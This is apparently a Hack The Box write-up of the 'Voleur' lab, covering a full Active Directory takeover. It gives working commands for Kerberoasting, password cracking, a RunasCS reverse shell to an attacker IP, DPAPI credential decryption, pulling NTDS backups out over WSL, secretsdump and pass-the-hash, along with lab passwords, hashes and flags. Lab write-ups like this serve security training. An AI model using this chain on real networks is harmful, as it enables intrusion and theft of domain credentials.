# 🧑‍💻 Hack The Box – Voleur

## 📌 Overview
- **Machine Name:** Voleur
- **IP Address(es):** 10.10.11.76
- **Difficulty:** Hard
- **OS:** Windows / WSL (Ubuntu 20.04)
- **Tags:** Kerberos / LDAP / SMB / Kerberoasting / DPAPI / WSL / Secretsdump / Backup Abuse
- **Date Completed:** 2025.08.26
- **Status:** ✅ User | ✅ Root

---

## 🖥️ Initial Recon

### Nmap
```zsh
nmap -sC -sV -p- 10.10.11.76 -oA voleur.nmap
```
**Key Findings:**
- Domain services (Kerberos, LDAP, SMB, WinRM)
- WSL exposed via SSH on **2222**
- Host: **dc.voleur.htb**

### Kerberos Realm Issue
While authenticating via SMB/LDAP with provided creds (`ryan.naylor / HollowOct31Nyt`) → `KRB_AP_ERR_SKEW`.  
Fixed with:
```zsh
sudo ntpdate 10.10.11.76
```

Configured `/etc/krb5.conf`:
```ini
[libdefaults]
  default_realm = VOLEUR.HTB
  fcc-mit-ticketflags = true

[realms]
  VOLEUR.HTB = {
    kdc = DC.VOLEUR.HTB
    admin_server = DC.VOLEUR.HTB
  }
```

Obtained TGT:
```zsh
impacket-getTGT -k voleur.htb/ryan.naylor:HollowOct31Nyt
export KRB5CCNAME=ryan.naylor.ccache
```

---

## 📂 LDAP & SMB Enumeration

Enumerated users:
```zsh
nxc ldap voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
```
**Users Discovered (11 total):**
- Administrator  
- Guest  
- krbtgt  
- ryan.naylor  
- marie.bryant  
- lacey.miller  
- svc_ldap  
- svc_backup  
- svc_iis  
- svc_winrm  
- jeremy.combs  

Shares accessible:
```zsh
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
```
- Finance  
- HR  
- IT (READ)  
- SYSVOL / NETLOGON  

---

## 🔎 Looting IT Share

Downloaded `Access_Review.xlsx` from IT share.  
```zsh
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --share 'IT' --get-file '\First-Line Support\Access_Review.xlsx' Access_Review.xlsx
```

Cracked XLSX password:
```zsh
office2john Access_Review.xlsx > accessreview.hash
john --wordlist=/usr/share/wordlists/rockyou.txt accessreview.hash
```
Password → **football1**  

Extracted contents revealed **service account credentials**:
- `svc_ldap / M1XyC9pW7qT5Vn`
- `svc_iis / N5pXyW1VqM7CZ8`
- `svc_winrm` → password reset by Lacey (not directly listed)

Also note: **Ryan** has **Kerberos Pre-Auth disabled**.

---

## 🔑 Service Account Access

Tested creds:
```zsh
nxc smb dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k
[+] Success
nxc smb dc.voleur.htb -u svc_iis -p N5pXyW1VqM7CZ8 -k
[+] Success
```

Performed **Kerberoasting**:
```zsh
python3 targetedKerberoast.py -d voleur.htb -k --no-pass --dc-host dc.voleur.htb
```
Hashes obtained for:
- `lacey.miller` (not cracked)  
- `svc_winrm` (cracked)

Cracked `svc_winrm` hash via Hashcat:
```
svc_winrm : AFireInsidedeOzarctica980219afi
```

---

## 🚪 Foothold – Evil-WinRM

With cracked svc_winrm:
```zsh
impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```
✅ Shell as `svc_winrm`.

---

## 🧭 Privilege Escalation Chain

### 🔄 Runas → svc_ldap
Used RunasCS to impersonate svc_ldap:
```powershell
RunasCS.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.16.2:9999
```

### ♻️ AD Recycle Bin → Todd Wolfe
Recovered deleted user `Todd.Wolfe`:
```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Restore-ADObject -Identity <GUID>
```
Password known from Access Review doc:  
`todd.wolfe / NightT1meP1dg3on14`

### 🗝️ DPAPI Credential Dump
As Todd, exfil AppData → decrypted DPAPI creds:
- User: `jeremy.combs`
- Password: `qT3V9pLXyN7W4m`

### 🧑 Jeremy Access
```zsh
impacket-getTGT voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m'
export KRB5CCNAME=jeremy.combs.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

Inside Jeremy’s folder → found **id_rsa** for WSL `svc_backup`.

### 🐧 WSL Pivot
SSH into WSL:
```zsh
ssh -i wsl -p 2222 svc_backup@voleur.htb
```

Navigated to mounted C: drive → located **Active Directory backups** (`ntds.dit`, registry hives).

### 📦 Exfil & Dump
```zsh
scp -r -i wsl -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups" .
impacket-secretsdump -ntds Backups/Active\ Directory/ntds.dit -system Backups/Registry/SYSTEM local
```

Extracted Administrator NT hash:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
```

Authenticated as Domain Admin:
```zsh
impacket-getTGT -hashes :e656e07c56d831611b577b160b259ad2 'voleur.htb/Administrator'
evil-winrm -i dc.voleur.htb -r voleur.htb
```

✅ Full Domain Compromise.

---

## 🏁 Flags
- **User.txt:** `970eb9c987b92c0dcdf1fe702d224e6e`
- **Root.txt:** `9c4132e88fcfa35da86a28599b906e3f`

---

## 🧠 Lessons Learned

**Technical**
- Time skew issues (`KRB_AP_ERR_SKEW`) → always sync clock with DC.  
- Kerberos Pre-Auth disabled users are excellent AS-REP roasting targets.  
- Office docs often hide service account passwords.  
- Kerberoasting + Hashcat can quickly pivot to service accounts with high privileges.  
- DPAPI + Recycle Bin + WSL backup abuse chain is realistic and powerful.  

**Personal**
- Careful organization of creds was necessary to avoid confusion.  
- Validating each step with `nxc` avoided rabbit holes.  
- Pivot into WSL was unexpected but rewarding.  

**Reusable Techniques**
- `/etc/krb5.conf` fix for Kerberos auth.  
- Cracking protected Office docs for credentials.  
- DPAPI decryption workflow (`masterkey → credential`).  
- Exfil AD backups from WSL → dump NTDS via `secretsdump`.  
